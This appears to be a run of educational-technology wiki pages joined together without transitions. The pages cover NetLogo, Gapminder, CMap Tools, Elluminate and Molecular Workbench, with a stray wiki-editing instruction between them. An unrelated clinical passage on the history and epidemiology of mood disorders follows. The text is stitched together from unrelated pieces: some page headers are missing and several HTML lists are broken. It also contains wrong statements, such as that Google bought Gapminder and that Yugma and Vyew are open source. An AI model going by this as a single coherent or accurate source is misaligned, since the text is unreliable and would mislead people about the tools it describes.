Sharon Smaldino (2005) explains the advantages and limitations of using simulations in a classroom setting. The advantages are: Realism- the prime advantage of simulations is that they allow practice of real-world skills. Safe- Learners can practice risky activities without risking injury to themselves or to others. Simplified- Simulations are intended to capture the essential features of a situation. Smaldino (2005) also illustrates two limitations that pose hurdles for educators while using simulations. They are: Time Consuming- Learning how to effectively run and integrate the program may take time to perfect. Oversimplification- The concern is that a simulation might give students a false understanding of the real-life situation. Keeping the advantages and limitations in context, educators can find creative ways to enhance the advantages and create techniques that limit the disadvantages.

Integrating technology into the classroom is a skill that teachers must constantly practice, due to the ever changing nature of technology. As a simulation, NetLogo is very suitable for being integrated into social studies lessons. Instructional simulations are particularly well suited for the following: development of decision making skills, learning about social interaction and human relations, and training in complex skills that might otherwise be too hazardous or expensive in real-life settings.{{ref|Smaldino, et. al}} In conclusion, simulations provides students a laboratory to explore social studies issues that transcend traditional textbook use.

== '''Sample Activities''' ==
[[Image:Netlogo.gif|right|thumb|350pxl|NetLogo Simulation]]
There is a model library file that contains sixteen social studies simulations. The simulations are:
Aids, 
Altruism, 
Cooperation,
El Farol,
Ethnocentrism,
Party,
Rebellion,
Rumor Mill,
Scatter,
Segregation,
Simple Birth Rates,
Team Assembly,
Traffic Basic,
Traffic Grid,
Voting, and
Wealth Distribution.  There are many model simulations in the areas of biology, chemistry and physics and six specific to earth science.  The earth science models are:  Climate Change, Continental Divide, Erosion, Fire, Grand Canyon and Percolation.

== Overview ==
When taking a look at two dimension graphs and even three dimensional graphs, one cannot experience the power that a Gapminder Motion Chart can show you.  Imagine taking 200 two dimensional graphs of Income per person vs. Life Expectancy at birth, one for each year from 1800 to 2000, and putting them in a flip book.  What would you see?  After making sure to flip each page correctly, you would see only one aspect of the Gapminder Motion Chart.  Hans Rosling took a Trendalyzer program to a new level by creating these motion charts where real information is put into a graph including many different aspects which will give any student the ability to make many connections throughout the learning that is going on in the classroom.  There are many aspects and variables that the students can explore which will relate to multiple lessons on social change in showing how daily life can affect, or be affected by, humans.


== Background of creation ==    
[[File:gapm.jpg|right|370px]] Hans Rosling: Physician by day, Illustrator by night.  In 2005, a talented professor of global health at Sweden's Karolinska Institute{{ref|TED}} decided to continue the development of the Trendalyzer software.  This software takes statistical numbers and creates a way to show the information so that every learner can understand and utilize it.  When listening to Hans Rosling, {{ref|Videos to watch}}  you will be blown away by the ability that he has to show development and understanding.  Hans, with help of his son and daughter-in-law, Ola and Anna, finished the creation of Gapminder in February of '05 {{ref|Gapminder}}. Gapminder was bought by Google in 2006 and now has it's home at Gapminder.org.  When looking to utilize a graph by Gapminder, one should go to Gapminder World to choose the parameters and run the application. 


== Description of Application ==
The number of variables that can be discussed throughout this software are truly endless.  Not only does this program hold capabilities of showing more than two variables on a graph, the axes are equipped with multiple variables that any teacher can choose to help show the differences between multiple situations.  Teachers and students are able to stop the play by play action to discuss reasons for the outcomes and differences along with highlighting on countries that could be of a certain importance for the lesson or task at hand.  Along with just highlighting and discussing a country’s effect, one can also view how a countries’ population, a possible third variable that is included free of the two that would be found on the axes, can make an impact on the results that are viewed by “playing” with these motion charts.  

===Variables===
Just to name a few, but in order to gain appreciation for the work that has been put into this software, here are some of the variables that one, meaning teacher or student, explorer or experienced statistician, can choose to evaluate the effect on the worldly conditions on: [[File:gapmind.jpg|left|370px]] 
 
•	Income per person
•	Infant mortality rate
•	Children per woman
•	Life expectancy at birth
•	CO2 emissions
•	Sugar consumption per person
•	Female labor force
•	Military expenditure
•	Total income
•	Primary school completion (of girls &amp;/or boys)
•	Ratio of girls to boys in Primary and Secondary Ed
•	Literacy rate (adult vs. child) or (girls/boys/ total)
•	Population
•	Children and elderly (per adults)
•	Surface area
•	Paved roads
•	Urban population
•	Maternal Mortality rate
•	Health issues (Included are many) 
•	Electricity Or Oil consumption
•	Cell phone use
•	Internet users
•	Poverty
•	Export/Import of goods and services




== Transformative Potential ==
Gapminder has many reasons why it has transformative potential.  Not only is Gapminder, extremely affordable, it's free, but it's also very easy to learn and use.  Many teachers and students will be able to use and learn from the program as it can relate to any age group depending on the level of in-depth they allow their thinking, including critical, can be.  With this program, you can also utilize the potential to review and discuss material that was covered in class.  Almost anyone can access the program, as long as the internet version runs appropriately.  The videos are also a very easy way to learn more about the program by watching Hans Rosling demonstrate his program. {{ref|Videos to watch}} The downloads section is another way to utilize the program if the internet version is not running correctly on the computers- simply download the item you are interested in and download flash and you should still be able to use the same concept of Motion Charts in a lesson. {{ref|Downloads}}


== Sample Activities/ Connections==
A teacher or student can use Gapminder to explain:
===[Math]===
=====Graphs=====
Students can interpret and predict worldly events by viewing the graphs that have been created based on past known information.  The great thing about this program is that students can choose their own parameters and can choose their own ways of thinking about the outcome.  There are many different ways to explain the graphs and many different variables to comment on.  The student can choose their path and the amount of variables they want to discuss.  This therefore, is a great way to show differentiation due to the student's ability to choose how complex their interpretations are going to be. 

=====Relationships=====
In a similar way as using graphs, students can use this program to explain relationships in sets of data shown on the Motion Charts. 

===[Science]===
=====Health Situations=====
Socially, in a health class sort of way, students can view the parameters of what carbon dioxide does to our health or life expectancy, along with other sorts of health issues vs. income, etc.  

=====Affects of Change in the Environment=====
Students can view graphs on renewable resources vs. income, etc. and explain why these situations are occurring based on the fact that they can also view information on surface area, forest area, paved area, etc to show the environmental affects.

===[Social Studies]===
=====Population Variances=====
Students can view population trends on the graphs to show how historical events may have caused the different affects shown on the graphs by having the bubbles change. 

=====Geographical Changes=====
Students could view the graphs in order to use their knowledge of historical events to explain the changes in paved roads, CO&lt;sub&gt;2&lt;/sub&gt; use, and forested areas. 

=====World Phenomenon=====
This can be based upon on historical events that they learned about in Social Studies.

== Introduction ==

[[Image:Concept_Map_About_Concept_Maps.jpg|left|thumb|450px|A Concept Map on Concept Maps, courtesy of IHMC; see live map here http://cmap.ihmc.us/conceptmap.html]]

CMap Tools (http://cmap.ihmc.us/conceptmap.html) is a concept mapping freeware utilized as a visual learning tool used to organize, present, and share knowledge.   CMap tools allows learners to look at the relationships between concepts and understand them as part of understanding a single concept.  The software encourages collaboration and allows users to share ideas and to make comments. This process provides interactive learning among students of all different types and levels.  This page explores the CMap Tools application, how to use the software, its transformative potential, and will provide you with some tools that you might need to integrate concept maps into your classroom.

==History==

[[File:Conceptmap.gif|right|thumb|450px|]]

In the 1960's educational psychologist, David Ausabel, http://en.wikipedia.org/wiki/David_Ausubel, proposed the idea that cognitively learning is achieved by ''assimilation'' of new concepts to join and expand upon previously held knowledge by the learner. Thus, in the mind of the learner, a sort of structure is developed known as the ''cognitive structure''. &lt;ref&gt; Novak &amp; Cañas (2008). The theory underlying concept maps and how to construct them.  Available at http://cmap.ihmc.us/Publications/ResearchPapers/TheoryUnderlyingConceptMaps.pdf .&lt;/ref&gt;

The development of Concept Maps emerged via the work of Joseph Novak,  http://en.wikipedia.org/wiki/Joseph_D._Novak, was done in 1972. While researching education in science, children were interviewed, but the need arose for some sort of documentation of the data, and the format of graphic representation emerged.&lt;ref&gt; Novak &amp; Cañas (2008). The theory underlying concept maps and how to construct them.  Available at http://cmap.ihmc.us/Publications/ResearchPapers/TheoryUnderlyingConceptMaps.pdf .&lt;/ref&gt;

== Description of Application ==

A '''concept map''' allows learners to identify knowledge within a particular context, typically by using a ''focus question''. A list of core topics, or key concepts are developed and identified that relate to the domain knowledge and the topics should be ordered in a hierarchical sense. One of the advantages of using software to participate in this process is that the reordering or restructuring of the hierarchy layout can be done easily. A concept map can be an ongoing project to be reconstructed as knowledge evolves. After the rough hierarchy has been enacted, links between the conepts should be developed showing the relationship  between topics. &lt;ref&gt; Novak &amp; Cañas (2008). The theory underlying concept maps and how to construct them.  Available at http://cmap.ihmc.us/Publications/ResearchPapers/TheoryUnderlyingConceptMaps.pdf .&lt;/ref&gt; This method of learning enables learners to understand that ideas are not isolated and free standing.  Ideas and concepts are linked to additional ideas and concepts and learning how and why can help us to understand the main concept we are trying to learn.

Jonassen defines concept maps as &quot;spacial representations of concepts and their interrelationships that stimulate the knowledge structures that humans store in their minds.&quot; &lt;ref&gt;Jonassen, D., Howland, J., Marra, R., &amp; Crismond, D. (2008). ''Meaningful learning with technology''. Upper Saddle River, NJ: Pearson, Prentice Hall.&lt;/ref&gt;  Jonassen concurs with the Novak and Cañas description by stating, &quot;Concept mapping is a process of identifying important concepts, arranging those concepts spatially, and identifying relationships among those concepts, and labeling the nature of the relationships among those concepts.&quot; &lt;ref&gt;Jonassen, D., Howland, J., Marra, R., &amp; Crismond, D. (2008). ''Meaningful learning with technology''. Upper Saddle River, NJ: Pearson, Prentice Hall.&lt;/ref&gt; Concept maps allow learners to contemplate relationships among ideas and thoughts and also think about how the ideas fit together, learning by analyzing and reviewing many thoughts and ideas.

== How to Use CMap Tools ==

To download CMap Tools, go to the following website:
[http://cmap.ihmc.us/conceptmap.html CMap Tools Homepage]
On the homepage of the site you will see a user manual and site description using the actual software tool.

CMap Tools was developed at the Institute for Human and Machine Cognition, joining the concept mapping theory with a practical technology partner. The software can be downloaded for free, projects may be developed, used and revised at home by students or in the classroom. One of it's greatest strengths is the powerful collaborative community available to users. The concept map on CMaps can be enhanced by linking items that include images, documents, videos, charts, or other concept maps. &lt;ref&gt; Novak &amp; Cañas (2008). The theory underlying concept maps and how to construct them.  Available at http://cmap.ihmc.us/Publications/ResearchPapers/TheoryUnderlyingConceptMaps.pdf .&lt;/ref&gt; 

CMap Tools allows users to sketch out ideas with boxes or circles and show their interrelated ideas and concepts by linking these other boxes with arrows.  The software permits users to add embedded links, so a user can click on a concept and be directed to a website or a separate file that gives more information about that concept.  This is a free software that can be downloaded to any computer and so it is a wonderful tool for collaboration between defined learning groups or anyone who is interested.

== Sample Activities ==

===Uses and Learning Activities===

Concept Maps with resources can be used for the following activities in the classroom: &quot;Pre &amp; Post Assessments, Lesson Assignments, Internet &amp; Cmap Searches, Research, Data Collection/Interpretation, Report Preparation, Oral Presentations, Drawings-Photos-Videos, Group Collaboration, Multi-Disciplinary Integration, Related Readings, and Expert Skeleton Maps.&quot;&lt;ref&gt; Novak &amp; Cañas (2008). The theory underlying concept maps and how to construct them.  Available at http://cmap.ihmc.us/Publications/ResearchPapers/TheoryUnderlyingConceptMaps.pdf .&lt;/ref&gt;

=== Distance Education ===

Concept Maps provide an outlet for ideas to be shared.  Distance education is becoming more and more popular, especially at the higher education level.  At any level, CMap tools will allow users to go online and share ideas via a concept map.

=== Brainstorming Sessions ===

In the classroom and in the workplace, CMap Tools allows users to share ideas and bring them all out for discussion.  The software encourages thinking and relationships.  Think about if you were trying to get your student's input for field trips.  How would you select a location, what learning activities would take place, and how does the offsite learning compare to learning in the classroom?  These are all things that can be explored with concept mapping.

== External Links ==

There are many online sources to assist with learning about concept maps and how to use them.  Take a look at some of the following sites to get some more information:

== Introduction ==

[[File:Screenshot_elluminate.png]]

&lt;font color=&quot;grey&quot;&gt;
Elluminate, Inc. is a company that offers a suite of services to facilitate online learning.  The combination of several Elluminate products offers a total solution for web based learning for almost anyone with a computer and network connection.  It is platform independent and allows students to interact and communicate via various connections in different locations.  The basic concept of the service is to create a virtual workspace for learners to attend and interact with others in an online setting.  The suite is comprised of three key components for teachers to use:  preparation, attendance, and archival.
&lt;/font&gt;

== Description of Application ==

Elluminate consists of three elements of use.  Preparation, presentation and archival allow learning content to be ready and available when needed.
 
=== Classroom Content Management ===
Teachers have the ability to plan and coordinate their lessons in a logical format prior to teaching their learners.  Content such as PowerPoint presentations, quizzes, videos, and much more can be preconfigured in order to be prepared for the session ahead of time.  This also allows the teacher to have more time to focus on facilitating conversation and collaboration with the learners during the live session.

=== Real-time Remote Collaboration ===
Learners participate in the live session by visiting a specified URL.  They can be equipped with as little as a computer and network connection, or use more robust communication tools including microphones and video cameras.  There are many tools in the virtual classroom that aid the teacher and learners to communicate, theorize and conceptualize ideas.  Tools such as the whiteboard and chat sessions, allow the learner to express ideas and thoughts visually to others.  The ability to speak via VOIP (voice over IP) or to call into a conference phone line promotes audible learning and articulation of thoughts.  A combination of audio and visual learning can also be experienced through the use of additional tools such as microphones and video cameras.  Based on the outcome of the session, it may be useful to also divide into subgroups to work on particular tasks.  Breakout rooms are available for this type of assignment, and the moderator can bring everyone back into the main session once sufficient time has been given for the breakout sessions.

=== Archival/Reuse ===
Recording the content is the last piece that completes the suite of tools.  Once the session is over, all of the recorded material can be distributed through various methods, allowing others to partake in the experience even after the session is over.  This also gives the teacher the opportunity to go back and evaluate the learners, and how they progress through the session.  Learners can go back and repeat sections in order to fully grasp certain concepts or ideas that may have been confusing or misunderstood while attending the live session.

== Transformative Potential ==

Online collaboration tools like Elluminate offer transformative potential for both the teacher and learner, and aids in motivating and enhancing the learning experience.  

====Elluminate for Teachers====
[[File:Elluminate_moderator.png|600px]]

With Elluminate, and other online collaboration tools, the teacher or moderator of the session has many features that exist in a typical classroom setting along with additional tools and resources.  As shown in the picture above, there is a wide range of tools and features that allow the teacher and learners to be actively involved with each other during the live session.  

The teacher can involve the students by quizzing them, or calling on an individual to answer a question or provide feedback.  They can present content using various tools including the whiteboard space, present PowerPoint or video.  Teachers can even take the learners on a Web Tour to view educational or informative sites.  Since each student is being guided through the site via the Elluminate software, it is less likely that they will become distracted by other sites or click away or get lost while navigating through the pages.

There are also tools that provide for ADA (American's with Disabilities Act) compliance, including Closed-Captioning, enlarged video views, and screen reader compatability.{{ref|ada}}  This opens up the availability to an audience that may not be able to participate in a typical classroom environment.

====Elluminate for Learners====
[[File:Elluminate_learner.png|600px]]

The availability of content and topics is exponentially increased with online offerings.  Online collaboration tools give the learner the opportunity to take part in something that may not have been possible in the past. Online classes no longer have to be based on reading books and writing about them or taking tests.  Education is made available to learners all over the world regardless of where the teacher is located in relation to the learner. 

Remote students are included in discussion, knowledge sharing, and other interactions with their peers.  The screen shot above identifies some of the features available to the learner.  Participants can raise their hand virtually with the click of a button to answer a question, or ask for assistance.  Emoticons can be used to indicate feeling or emotion of a topic, or alternatively audio/video inputs can be used for the learner to express thoughts and ideas in an audible or visual manner.

==== Open Source Alternatives ====
There are several open source alternatives available such as [http://www.yugma.com Yugma] and [http://www.vyew.com Vyew]. Each product provides a set of features and capabilities for teachers, but most are still in the early stages of development and have functional limitations.  [http://www.yugma.com Yugma] for example requires an application to be installed on the computer being used, which may require certain rights and access levels on the computer.  Also, it does not include built in functionality for voice.  Additional tools such as [http://www.skype.com Skype] are recommended by the software vendor to fill the void.

== Interesting ways of using Elluninate to Support Education ==

&lt;ul&gt;
&lt;li&gt;Distance Education for learners to attend learning sessions, anywhere in the world.&lt;/li&gt;
&lt;li&gt;Recording and archival of lectures for future use or presentation online.&lt;/li&gt;
&lt;li&gt;Replace in-class sessions with remote sessions rather than canceling class due to inclement weather or other unforeseen circumstances.&lt;/li&gt;
&lt;li&gt;Asynchronous content development.&lt;/li&gt;&lt;/ul&gt;
&lt;li&gt;Tutotring programs.&lt;/li&gt;
&lt;li&gt;Classroom collaboration.&lt;/li&gt;
&lt;li&gt;Meetings.&lt;/li&gt;
&lt;li&gt;Virtual office hours.&lt;/li&gt;
&lt;li&gt;Student/Parent orientation.&lt;/li&gt;
&lt;li&gt;Remote guest speakers and virtual field trips.&lt;/li&gt;
&lt;li&gt;Professional Development&lt;/li&gt;

The following is a list of activities that can utilize the free vRoom solution for use with 3 people or less.
&lt;ul&gt;
&lt;li&gt;&lt;b&gt;Small group exercises out of class - &lt;/b&gt;Group work can be facilitated by using the Elluminate software.  This can make it easier for those that may not be able to meet due to schedule conflict or other limitations restricting meeting time.&lt;/li&gt;
&lt;li&gt;&lt;b&gt;Remote classroom learning - &lt;/b&gt;For some classes, it may be feasible to offer the class remotely, rather that traveling to a central location.  In such cases, Elluminate can serve as the conference tool to communicate and collaborate.&lt;/li&gt;
&lt;li&gt;&lt;b&gt;Online parent teacher conference - &lt;/b&gt;Coordinating parent-teacher conferences can often be difficult.  Having an option like Elluminate to use as a communication medium provides additional flexibility to meet and discuss student progress. &lt;/li&gt;
&lt;/ul&gt;

== How to Add and Format Images ==

1. Go to the page where you want to add the picture

2. Log in to your account (it won't work without this step)

3. The &quot;upload file&quot; command will now show up in the Toolbox at the bottom of the left-hand column.

=='''Overview of ''Molecular Workbench{{ref|concord consortium}}'''==

Molecular Workbench (MW) is a sophisticated modeling platform useful for education at all levels, providing not only an environment for creating interactive simulations, but also an authoring tool for building user interfaces and creating guided learning activities. MW is one of the few software systems that was intentionally designed to support teaching and learning. It is equipped with a report and assessment system for collecting data and measuring learning with models and simulations. 

A copy of this open source (and therefore free) software can be downloaded from its home http://mw.concord.org.

The Molecular Workbench includes a &quot;Library of Models&quot; and an &quot;Activity Center,&quot; which aid both students and teachers in using the program and tailoring it to their own needs. The &quot;Library of Models&quot; contains hundreds of models organized into specific sections on chemistry, biology, physics and nanotechnology, mostly created by staff at the Concord Consortium and their collaborators. The &quot;Activity Center&quot; section of the ''Molecular Workbench'' program contains collections of fully-developed, classroom-ready activities in the fields of electron technology, biotechnology, chemistry and biology. These include 2D and 3D interactive models of molecules, bonds and chemical reactions. In addition, there are many non-molecular simulations, such as classic mechanics and quantum mechanics. The ''Molecular Workbench'' is a flexible system. It allows anyone to create any type of models and simulations supported by the system, and easily deploy them anywhere on the Internet. Pedagogically, it not only allows students to learn through well-designed, scaffolded activities, but also allows them to learn through open-ended model construction activities, as in the case of Scratch and Phun.

== Description of Application ==

This program was developed by the Concord Consortium to help provide secondary school students with concrete models of molecules that they could manipulate in order to enhance their understanding of the foundational principle of structure driving function at all levels, even those that can not be seen with the naked eye. Yet, the depth of coverage of some of the topics makes many of the activities applicable to introductory college courses as well.

MW allows students to interact and experiment with simulations based on real-time molecular dynamics (MD) calculations and visualizations [3]. It is not a set of animations! The molecular visualizations were created using java, and can support other applications, including ''Jmol'' (Available at http://jmol.sourceforge.net/), an open-source Java viewer for chemical structures that is embedded into ''Molecular Workbench.''  ''Jmol'' images are 3-D virtual models of molecules that can be manipulated by the users as needed to allow for a full exploration of the molecules that can help enhance their understanding of their structures.  Users can also pick the type of display (ball &amp; stick, spaced filled, ribbon, etc.) for the various molecules and this capability alone can be helpful in deciphering the interaction of the various atoms within the molecule.  Users (both students and teachers) can also author new models as needed.  

The &quot;Molecular Workbench&quot; software also contains embedded assessment items and built-in student tracking allowing instructors to follow the work of individual students or groups of students through the various activities. It also allows students to take &quot;snapshots&quot; of their work which can later be incorporated into reports or printed out as needed.  These &quot;snapshots&quot; include space for labeling and explaining the particular &quot;snapshot,&quot; allowing students to  describe the results of their manipulations at various stages as they work with a particular model or go through a specific activity. The snapshots are also seamlessly incorporated into embedded report templates, allowing students to easily create professional-looking reports for self-assessment, peer assessment or assessment by their instructors.  

There are also educational games and activities which again can be captured for assessment purposes as well. These embedded assessments can be used either formatively or summatively by both the students and the instructor.

== Transformative Potential ==

Science educators are calling for sweeping changes that focus less on facts and more on deep understanding of &quot;big ideas.&quot;{{ref|Wiggins and McTighe}} One of these big ideas in biology and chemistry is that the structure of something affects its function. In other words, how something works is often dependent on its physical aspects.  This is true of relatively large structures all the way down to the atomic level. When it comes to trying to understand the hows and whys of chemical reactions and many biological functions, being able to actually see and study the structure of chemicals and structures at the molecular level can create understanding of why it works the way it does.  Being able to zoom in on the details of a virtual model, zoom out for an overview or flip it over to view it from a different perspective can all lead to recognition of the similarities of these microscopic structures to models already understood in everyday life.  In other words, being able to manipulate virtual molecules can enhance understanding of why these molecules interact with others (react) the way they do.  As Wenglinsky put it &quot;activities that concretized or illustrated concepts proved associated with higher student performance.&quot;{{ref|Wenglinsky}}

The types of learning activities offered in this program encourage a constructivist approach to education, thus aiding in the transformation of the student learning experience.  Yet it is also important to note that the scaffolding within the authoring part of the program provides instructors' with the tools needed to create and support more constructivist activities in to their classrooms, a move that has been shown to enhance learning and retention in the sciences.{{ref|Jonassen, et. al}} Thus this program facilitates the transformation of both teaching and learning.

== Sample Activities ==

=== Visualizations ===

[[Image:An_dna.gif|left|100px|Visualization of a segment of DNA]] The program provided user-friendly options for changing this visualization of a segment of DNA (Deoxyribonucleic Acid).  Note that in this final version, the two different phosphate-sugar backbones are easily distinguishable from each other, further enhancing the understanding of what is meant by a &quot;double helix.&quot;  

This is a space-filled version.  The other display options include: ball-and-stick, wire frame, stick, Delaunay Triangulation, Voronoi Diagram or Delaunay &amp; Voronoi Overlay.  Molecular Workbench contains hundreds of interactive  molecular models like this one, that can be easily manipulated by the learners, even the first time they use the program. All they have to do is click on the molecule and drag the mouse.

Scaffolding, in the form of suggested activities, are provided to prevent learners from simply playing with the models. Be aware that the zoom feature is very fast, causing the viewer to pass by the particular molecule too quickly on some visualizations. Instructors may want to demonstrate this problem and how to &quot;find&quot; the molecule on the computer monitor again if their students &quot;fly by&quot; too quickly.

[[Image:Glycolytic_Active_site.png|left|thumb|200px|Close up of the active site of one of the enzymes of glycolysis]]





Both of these screenshots depict small molecules within their active or binding sites on much larger enzymes.  Note the change of perspective that can be seen by choosing two different types of display models.  The one on the left is a ball-and-stick molecule of a substrate (DHAP) within the active site of one of the enzymes of glycolysis.  The one below is a space-filled shot of a typical cell kinase with cAMP (cyclic Adenosine Monophosphate) in its active binding site.  Note the great difference in size between the ball-and-stick model of cAMP and this large enzyme made of globular protein.
[[Image:cAMP.gif|center|thumb|200px|cAMP enfolded in the active site of a typical kinase.]]

=== Learning Activities ===

''Molecular Workbench'' contains many different learning activities designed for use by secondary students.  Many have found the activities useful for post-secondary education as well.

[[Image:MW Concept Map on Motion.png|left|thumb|200px|Concept Map on Molecular Energy]]  The concept map on the left challenges the learner to think of a related concept to fill in the blank.  It is just one example of how the collaborative nature of ''Molecular Workbench'' leads to the incorporation of a wide variety of technological teaching tools, including ones like concept mapping that are not traditionally used in science education.

The Learning Activities section of ''Molecular Workbench'' also contains excellent simulations on a large variety of subjects including membrane transport and protein folding.  Unfortunately, these simulations run rather slowly, so in demonstrating them to a classroom of students, be sure to pull the models up earlier and simply minimize them to your desktop. 

A limited number of interactive essays (IE's)are also available in the Learning Activities portion of Molecular Workbench.  So far these essays have been mostly focused on chemistry, but an IE on osmosis is currently being created. A biology activity for the MIT Museum is also under construction, but almost completed.  I especially liked the section on drug discovery, since that process is a key component of the biotechnology industry.

=== History of this Program ===

This program has been developed by the Concord Consortium, with funding provided from the National Science Foundation.  The original grant was obtained by Dr. Boris Berenfeld and Dr. Robert Tinker in 2000 to help bring molecular modeling to K-12 science education.    

Dr. Charles Xie, a computational physicist, with expertise in molecular dynamics and quantum chemistry, developed this new software, the &quot;Molecular Workbench.&quot;  This software includes the use of &quot;Jmol&quot; (available at http://jmol.sourceforge.net/), an open-source Java viewer for chemical structures and allows users to manipulate 3-D models of various molecules and author new models as needed.  Dr. Xie has included extensive documentation and tutorials on this aspect of the program, as well as a blog that contains a history page that allows one to search either by the author or the type of molecule created.

=== Connections ===

The authoring capability creates a library of &quot;draft models&quot; and interactive simulations by pioneering educators across the globe, much like those found within WISE (the Web-based Inquiry Science Education site, available at http://wise.berkeley.edu). The program can be easily used within WISE, which helps create a powerful synergy for K-12 educators, when these programs are used together. For example, Dr. Dalit Levy contributed an MW-based activity within the TELS (Technology Enhanced Learning in Science) portion of WISE called &quot;Phases of Matter and Phase Change&quot; for 9-11th graders (see http://wise.berkeley.edu/teacher/projects/projectInfo.php?id=16999 )

=== Introduction ===

Manic-depressive illness is known since the era of Hippocrates (460–357 BC), Galen (131–201 AD) and Areteus from Kappadokia, and is described in ancient medical texts. Some authors believe that King Saul was also suffering from this disease and David used to relieve his depression by playing music for him. The ancient Greeks and Romans coined the terms &quot;melancholia&quot; and &quot;mania.&quot; Hippocrates was the first to describe melancholia which is the Greek word for &quot;black bile&quot; and simultaneously postulated a biochemical origin according to the scientific frame of that era, linking it to Saturn and the autumn.  
      
Mania was described as madness with elevated mood but it included a broad spectrum of excited psychotic states the way we understand them today. Soranus was the first to describe mixed states. Aretaeus of Cappadocia (2nd century AD) is considered to be the one who strongly connected melancholia with mania and made a description of manic episodes very close to the modern approach, including psychotic features and seasonality. 
      
Another interesting element in the theories that emerged during antiquity was the concept of temperament which was originally based on harmony and balance of the four humors, of which the sanguine humor was considered to be the healthiest but also predisposing to mania. The melancholic temperament was linked to black bile and was considered to predispose to melancholia. Since the time of Aristotle (384–322 BC), the melancholic temperament was linked to creativity. 
      
During the 10th and 11th century AD the Arab scholars dominated (Ishaq Ibn Imran, Avicenna and others). In 1621 Robert Burton wrote the first English-speaking text on the field of mood disorders &quot;The Anatomy of Melancholy.&quot; Later, the works of Jean-Philippe Esquirol (1772-1840), Benjamin Rush (1745–1813), Henry Maudsley (1835–1918), Jean-Pierre Falret (1794-1870) and Jules Gabriel Francois Baillarger (1809-1890) established the connection between depression and mania. Finally, Emil Kraepelin (1856–1926) established manic-depressive illness as a nosological entity (and separated it from schizophrenia) on the basis of heredity, longitudinal follow-up and a supposed favorable outcome.
      
Recent research data has reshaped our definition and understanding of bipolar and other mood disorders. Today the suboptimal outcome of mood disorders is well documented, especially in relationship to younger age of onset and to alcohol and substance abuse. Suicide is another major concern since up to 75% of patients who commit suicide suffer from some type of mood disorder.
      
Recently the World Health Organization (WHO) has ranked neuropsychiatric disorders as one of the most disability inducing causes world-wide, more disabling than cancer and cardiovascular diseases, and equal to injuries from all causes (World Health Organization, 2003). Affective disorders combined are the most disabling neuropsychiatric conditions and one of the 4 leading disability causes.

=== Phenomenology ===

==== Epidemiology ====

DSM-IV-TR unipolar major depressive disorder (U-MDD) is reported to be the most common mood disorder (Weissman et al. 1996). The overall current prevalence of MDD is estimated to be 4.7% for males and 6% for females and the annual incidence is around 1.59%. Depression of any type may afflict 10-25% of females and 5-12% of males at some time during their lives with the rates varying widely and depending on ethnic background, type of residential area, gender, age, social support and general somatic health status. The results of the US Epidemiologic Catchment Area (ECA) study suggest that disabling mood disorders affect as high as 5-8% of the general population and that if milder depression is included then the lifetime prevalence increases to 17% (National Comorbidity Study -NCS). When subclinical mood states are included, it is reported that one third of the general population will be affected (Dryman &amp; Eaton, 1991; Eaton, Dryman, Sorenson, &amp; McCutcheon, 1989; Eaton, Kramer et al. 1989). In spite of treatment, disability rates are high and suicide occurs in about 15% of patients, especially in men. Conversely, a significant proportion of suicide victims suffer from some kind of depressive state (Parkar, Dawani, &amp; Weiss, 2006; Seguin et al. 2006; Zonda, 2006). For some people depression is a single episode in life but around half of those experiencing an episode will experience more in the future, and the likelihood after the second episode is to experience a third episode within a decade or so. One third of patients will recover within the first 2-3 months, another third will need 6-8 months and around 15% of patients will not have recovered after 2 years, and they are likely to develop a chronic course (Kruijshaar et al. 2005; Patten &amp; Lee, 2004, 2005; Patten, 2006; Patten et al. 2006; Patten, 2007; Waraich, Goldner, Somers, &amp; Hsu, 2004; Wulsin, Vaillant, &amp; Wells, 1999).

The epidemiological data concerning the risk factors for MDD is rich but inconclusive. Women are twice as likely as men to experience an episode of MDD (Coryell, Endicott, Andreasen, &amp; Keller, 1985; Kessler, McGonagle, Swartz, Blazer, &amp; Nelson, 1993; Tennant, 1985; Weissman et al. 1988) and age plays a complex role (Koeniq, Meador, Cotlen, &amp; Blazer, 1988). MDD has an average age of onset between 20 and 40 years while bipolar disorder may appear more frequently in the early 20’s (Weissman et al. 1988). The effect of socioeconomic status is weak if it exists at all (Hollingshead &amp; Redlich, 2007). Marital status appears to be one of the most consistent risk factors for MDD with recently widowed, separated and divorced persons being at higher risk, and single and married persons at lower risk. A family history of MDD, especially in first-degree relatives, constitutes a major risk factor along with family history of suicide and alcoholism. Early childhood abuse per se may be related to increased neuroendocrine stress reactivity, which is further enhanced when additional trauma is experienced in adulthood (Heim et al. 2002).  Some personality features (introversion, worry, dependency and interpersonal sensitivity) as well as social stressors and social support also constitute risk factors (Farmer et al. 2001; Iacovides, Fountoulakis, Fotiou, &amp; Kaprinis, 2002; Paykel, 1994, 2001a, 2001b).  Life events (especially loss and bereavement), chronic stress (financial, family and interpersonal difficulties), and daily hassles as well as routine changes even due to positive events (e.g., change in residency due to promotion at work) all constitute risk factors (Fotiou, Fountoulakis, Iacovides, &amp; Kaprinis, 2003; Rijsdijk et al.2001). In addition, it has been reported that adolescent life events predicted an increased risk for major depression diagnosis in early adulthood (Pine, Cohen, Johnson, &amp; Brook, 2002) The conclusion from few available community-based studies suggested that younger age, low social class, negative and stressful life events linked to the family were associated with increased risk of new onset depression (Friis, Wittchen, Pfister, &amp; Lieb, 2002).

Originally it has been suggested that the classic manic depressive psychosis had a prevalence of around 1% (0.4-1.6%). However, today we know that the true prevalence depends on the definition, and to an extent, the sub-threshold bipolar cases and pseudo-unipolar patients. In addition, personality disorders (PDs), especially borderline personality disorder, are included under the umbrella of the bipolar spectrum or under unipolar depression. Another open question is whether the avoidant and the dependent PDs constitute real PDs or instead are residuals of a previously experienced major depressive episode. This is because these two PDs have been detected only in patient populations and not really in general population samples. 
      
DSM-IV-TR Bipolar disorder (BD) type I and type II have a combined prevalence rate of up to 3.7%. The literature on the lifetime prevalence of BD suggests an overall rate of 3-6.5% including a wider spectrum of bipolarity in comparison to the DSM-IV-TR definition (Acorn, 1993; Angst, 1998; Judd &amp; Akiskal, 2003).
      
As for other risk factors (Laursen, Munk-Olsen, Nordentoft, &amp; Bo Mortensen, 2007), although younger age, marital status (separated/divorced) and negative life events have been suggested to play a role, perhaps the best proven risk factor is the genetic transmission of bipolar disorder, which is much higher than that of MDD.

==== Clinical symptoms and classification ====

The onset of mood episodes can be acute or insidious, and emerge from a low-grade, intermittent, and protracted mood substrate which can resemble a dysthymic or cyclothymic state or even personality features (Fogel, Eaton, &amp; Ford, 2006). These mood states can also prevail during the inter-episode period and may give rise to low quality of life, interpersonal conflicts and significant global disability. Furthermore, these subthreshold disorders are quite frequent in the families of patients (Shankman, Klein, Lewinsohn, Seeley, &amp; Small, 2008). 
